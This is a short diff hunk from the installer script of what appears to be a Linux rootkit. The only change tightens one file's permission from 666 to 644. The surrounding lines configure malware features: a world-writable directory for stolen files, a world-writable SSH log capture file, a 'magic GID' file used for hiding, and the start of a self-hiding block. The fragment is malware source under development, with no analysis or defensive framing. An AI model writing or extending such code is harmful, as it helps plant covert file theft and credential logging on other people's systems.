@@ -162,7 +162,7 @@ echo 'moving some files'
 [ $FILE_STEAL == 1 ] && { mkdir -p $INTEREST_DIR && chmod 666 $INTEREST_DIR && ln -s $INTEREST_DIR $INSTALL_DIR/interest_dir; }
 [ $LOG_SSH == 1 ] && { mktouch $SSH_LOGS && chmod 666 $SSH_LOGS && ln -s $SSH_LOGS $INSTALL_DIR/ssh_logs; }
 [ $READ_GID_FROM_FILE == 1 ] && { mktouch $GID_PATH && chmod 644 $GID_PATH && cat $INCLUDE_DIR/magic_gid > $GID_PATH; }
-[ $AUTO_GID_CHANGER == 1 ] && { mktouch $GIDTIME_PATH && chmod 666 $GIDTIME_PATH; }
+[ $AUTO_GID_CHANGER == 1 ] && { mktouch $GIDTIME_PATH && chmod 644 $GIDTIME_PATH; }
 rm -r $INCLUDE_DIR
 
 if [ $HIDE_SELF == 1 ]; then
